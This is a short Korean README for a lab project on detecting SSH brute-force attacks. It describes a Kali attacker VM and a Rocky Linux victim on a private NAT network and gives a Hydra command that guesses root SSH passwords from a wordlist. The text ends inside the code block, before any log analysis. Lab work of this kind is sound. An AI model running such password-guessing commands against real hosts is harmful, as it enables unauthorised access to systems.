# 🔐 SSH Brute Force 공격 탐지 및 로그 분석 프로젝트

## 📌 프로젝트 개요
본 프로젝트는 SSH 서비스에 대한 Brute Force 공격을 수행하고, 발생한 로그를 분석하여 공격 패턴을 식별하는 것을 목표로 한다.

---

## 🖥️ 환경 구성
- 공격자: Kali Linux (192.168.85.134)
- 피해자: Rocky Linux (192.168.85.130)
- 네트워크: NAT 환경

---

## 💣 공격 수행
Hydra를 사용하여 SSH brute force 공격 수행

```bash
hydra -l root -P pass.txt ssh://192.168.85.130 -t 4	
